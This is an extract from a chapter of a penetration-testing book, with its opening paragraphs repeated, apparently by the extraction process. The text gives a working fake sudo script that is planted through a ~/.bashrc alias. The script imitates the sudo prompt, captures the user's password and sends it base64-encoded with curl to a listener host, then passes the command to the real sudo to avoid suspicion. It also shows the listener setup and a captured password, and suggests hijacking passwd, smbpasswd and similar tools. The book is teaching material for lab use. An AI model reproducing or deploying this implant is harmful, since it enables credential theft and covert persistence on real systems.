@@ -1,0 +1,73 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 9 - , we used misconfigurations of the sudo command to elevate our privileges. But we can compromise sudo in another way: by replacing it with our own malicious version, then harvesting the user’s password when they enter it to run the command.
+The main downside to this approach is that when a user provides a correct password to sudo, it caches the credentials for a period (such as 15 minutes), and subsequent commands won’t require reentering the password. The setting responsible for the caching duration is called timestamp_timeout.
+Despite the caching, if we’re able to intercept the execution when the user enters their password the first time, we may be able to leak their password. Let’s walk through such an example. In this scenario, we assume we have access to alter a user’s environment and can modify files such as ~/.bashrc.
+We’ll create a fake sudo script. Then we’ll modify a compromised user’s environment so that calling sudo will execute the fake version through the use of an alias, send their password over the network by using curl, and continue the normal sudo execution flow, to avoid raising suspicion.
+Let’s begin! You can perform this scenario on p-jumpbox-01 (172.16.10.13) by implanting the fake sudo script in the backup user account. Create this fake sudo file somewhere writable:
+$ touch /tmp/sudo && chmod +x /tmp/sudo
+Next, create an alias by adding a line to the compromised user’s ~/.bashrc environment file:
+alias sudo='/tmp/sudo'
+Finally, populate the script with the code in Listing 10-8.
+#!/bin/bash
+ARGS="$@"
+Security Relevance Score: 6
+Word Count: 659
+Extracted: 2025-06-13 23:40:57
+
+---
+
+, we used misconfigurations of the sudo command to elevate our privileges. But we can compromise sudo in another way: by replacing it with our own malicious version, then harvesting the user’s password when they enter it to run the command.
+The main downside to this approach is that when a user provides a correct password to sudo, it caches the credentials for a period (such as 15 minutes), and subsequent commands won’t require reentering the password. The setting responsible for the caching duration is called timestamp_timeout.
+Despite the caching, if we’re able to intercept the execution when the user enters their password the first time, we may be able to leak their password. Let’s walk through such an example. In this scenario, we assume we have access to alter a user’s environment and can modify files such as ~/.bashrc.
+We’ll create a fake sudo script. Then we’ll modify a compromised user’s environment so that calling sudo will execute the fake version through the use of an alias, send their password over the network by using curl, and continue the normal sudo execution flow, to avoid raising suspicion.
+Let’s begin! You can perform this scenario on p-jumpbox-01 (172.16.10.13) by implanting the fake sudo script in the backup user account. Create this fake sudo file somewhere writable:
+$ touch /tmp/sudo && chmod +x /tmp/sudo
+Next, create an alias by adding a line to the compromised user’s ~/.bashrc environment file:
+alias sudo='/tmp/sudo'
+Finally, populate the script with the code in Listing 10-8.
+#!/bin/bash
+ARGS="$@"
+
+leak_over_http() {
+  local encoded_password
+❶ encoded_password=$(echo "${1}" | base64 | sed s'/[=+/]//'g)
+  curl -m 5 -s -o /dev/null "http://172.16.10.1:8080/${encoded_password}"
+}
+
+❷ stty -echo
+❸ read -r -p "[sudo] password for $(whoami): " sudopassw
+
+leak_over_http "${sudopassw}"
+❹ stty echo
+echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARGS}
+
+Listing 10-8: A fake sudo script
+At ❷, we turn off input echoing by using stty -echo. We then read input from the user and present a sudo-like prompt ❸. As the input is the user’s password, it shouldn’t be presented in cleartext to the user while they’re typing it. This is because, by default, sudo hides the input while it’s being typed, and we need to emulate the look and feel of the original command. So, we disable input echoing before accepting input from the user.
+Next, we leak the provided password by using the leak_over_http() function. This function will use base64 to encode the password and use curl to make an HTTP GET request to a path on the web server, using the captured password as the path ❶.
+At ❹, we turn on input echoing and pass the password, along with the command the user executed, to the real sudo binary (/usr/bin/sudo) so that the sudo execution resumes normally. Figure 10-1 highlights this flow from end to end.
+
+Figure 10-1: A password interception flow using a fake sudo script
+
+Finally, on your Kali machine, use Python to run a simple HTTP server:
+$ python -m http.server 8080
+
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)...
+
+Then open another terminal to p-jumpbox-01 (172.16.10.13) and run a sudo command:
+$ sudo vi --help
+
+[sudo] password for backup:
+
+You should receive the leaked password:
+172.16.10.13 - - [22:59:32] "GET /YmFja3VwCg HTTP/1.1" 404 -
+The bolded base64-encoded string is backup, which is the password of the backup user.
+You can find this script at https://github.com/dolevf/Black-Hat-Bash/blob/master/ch10/fake_sudo.sh.
+Exercise 21: Hijacking Password Utilities
+You could use an approach similar to the sudo attack we just performed to hijack other utilities. Any tool that interacts with credentials can help you gain persistence, including the following:
+passwd For changing local user passwords
+chpasswd For updating passwords in bulk
+htpasswd For setting up or changing Apache basic authentication
+smbpasswd For changing Samba user passwords (such as Active Directory user passwords)
+ldappasswd For changing Lightweight Directory Access Protocol user passwords
+Try programming a fake command that accepts passwords as input. Here is guidance on how to go about this:
